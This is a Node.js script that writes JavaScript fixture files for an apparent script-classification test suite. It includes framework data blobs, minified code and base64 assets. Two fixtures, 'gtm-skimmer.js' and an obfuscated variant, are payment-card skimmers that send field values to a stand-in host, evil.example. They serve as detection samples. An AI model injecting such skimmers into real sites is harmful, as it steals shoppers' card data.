// Regenerates the code samples in this folder: node test/fixtures/code/generate.mjs
import { writeFileSync } from 'node:fs';

const here = (f) => new URL(f, import.meta.url);
const w = (f, s) => writeFileSync(here(f), s);

const woo = (nonces) => `/* <![CDATA[ */\nvar wc_checkout_params = {"ajax_url":"/wp-admin/admin-ajax.php","wc_ajax_url":"/?wc-ajax=%%endpoint%%","update_order_review_nonce":"${nonces[0]}","apply_coupon_nonce":"${nonces[1]}","remove_coupon_nonce":"${nonces[2]}","option_guest_checkout":"yes","checkout_url":"/?wc-ajax=checkout","is_checkout":"1","debug_mode":"","i18n_checkout_error":"Error processing checkout. Please try again."};\n/* ]]> */`;
w('woo-a.js', woo(['a1b2c3d4e5', 'f6a7b8c9d0', '1122334455']));
w('woo-b.js', woo(['9f8e7d6c5b', '0a9b8c7d6e', '5544332211']));

w('next-data-a.js', 'window.__NEXT_DATA__ = {"props":{"pageProps":{"products":[{"id":1,"title":"Shirt","price":19.99,"image":"https://cdn.shop.example/i/1.jpg"},{"id":2,"title":"Hat","price":9.5,"image":"https://cdn.shop.example/i/2.jpg"}]}},"page":"/","buildId":"abc123"};');
w('next-data-b.js', 'window.__NEXT_DATA__ = {"props":{"pageProps":{"products":[{"id":7,"title":"Scarf","price":29,"image":"https://cdn.shop.example/i/7.jpg"}]}},"page":"/","buildId":"def456"};');

const flight = (text) => `(self.__next_f=self.__next_f||[]).push([1,${JSON.stringify(`0:["$","html",null,{"lang":"en","children":"${text}"}]\n`)}])`;
w('flight-a.js', flight('Shirt 19.99'));
w('flight-b.js', flight('Hat 9.50, Scarf 29.00, Gloves 12.00'));

w('nuxt-a.js', 'window.__NUXT__=(function(a,b,c){return {data:[{title:a,price:b}],state:{cart:c},serverRendered:true}}("Shirt",19.99,[]));');
w('nuxt-b.js', 'window.__NUXT__=(function(a,b,c,d){return {data:[{title:a,price:b},{title:c,price:d}],state:{cart:[]},serverRendered:true}}("Hat",9.5,"Scarf",29));');

w('login-inline.js', 'document.addEventListener("DOMContentLoaded", function () {\n  var form = document.getElementById("login");\n  fetch("https://api.shop.example/session", { credentials: "include" });\n  form.dataset.ready = "1";\n});');

w('gtm-skimmer.js', '(function(){var f=document.querySelector("#cc");f.addEventListener("blur",function(){new Image().src="https://evil.example/c?d="+btoa(f.value)})})();');

w('readable.js', '// Shows or hides the delivery address form.\nfunction toggleDeliveryAddress(useBillingAddress) {\n  const section = document.querySelector(".delivery-address");\n  if (useBillingAddress) {\n    section.hidden = true;\n  } else {\n    section.hidden = false;\n  }\n}\n\ndocument.querySelector("#same-address").addEventListener("change", function (event) {\n  toggleDeliveryAddress(event.target.checked);\n});\n');

let min = '';
for (let i = 0; i < 40; i++) min += `function u${i}(e,t,n){var r=e.memoizedState,o=t.pendingProps;if(null===r){r=e.memoizedState={baseState:o,queue:null};}for(var a=0;a<n.length;a++)r.queue=n[a]||r.queue;return"function"==typeof o.render?o.render(r):null}`;
w('react-min.js', `!function(){"use strict";${min}var Ce="https://react.dev/errors/";function xe(e){return Ce+e}}();`);

const hex = (s) => [...s].map((c) => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
const words = ['collect', 'https://evil.example/c', 'value', 'addEventListener', 'submit', 'querySelector', '#card', 'btoa'];
let obf = `var _0x3a1f=[${words.map((x) => `'${hex(x)}'`).join(',')}];`;
obf += "(function(_0x2d8f05,_0x4b81bb){var _0x4d74cb=function(_0x32719f){while(--_0x32719f){_0x2d8f05['push'](_0x2d8f05['shift']());}};_0x4d74cb(++_0x4b81bb);}(_0x3a1f,0x1a3));";
obf += 'var _0x5e2a=function(_0x1b2c3d,_0x4e5f6a){_0x1b2c3d=_0x1b2c3d-0x0;var _0x7a8b9c=_0x3a1f[_0x1b2c3d];return _0x7a8b9c;};';
for (let i = 0; i < 30; i++) {
  const v = `_0x${(0x9abc + i).toString(16)}`;
  obf += `var _0x${(0x1a2b3c + i).toString(16)}=_0x5e2a('0x${(i % 8).toString(16)}');document[_0x5e2a('0x5')](_0x5e2a('0x6'))[_0x5e2a('0x3')](_0x5e2a('0x4'),function(${v}){new Image()['src']=_0x5e2a('0x1')+window[_0x5e2a('0x7')](${v}[_0x5e2a('0x2')]);});`;
}
w('obfuscated.js', obf);

const png = `iVBORw0KGgo${'AAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=='.repeat(40)}`;
const woff = `d09GMgABAAAAA${'Bq4AA0AAAAAOtgAABpgAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGh4GYACCWhEICoGFQIOcPwE2AiQDhCALghIABCAFhCQHi'.repeat(30)}`;
w('css-in-js.js', `const styles = {logo: { background: "url(data:image/png;base64,${png})" }, font: "@font-face{font-family:Brand;src:url(data:font/woff2;base64,${woff}) format(woff2)}"};\nexport function applyStyles(el) {\n  el.style.background = styles.logo.background;\n}\n`);
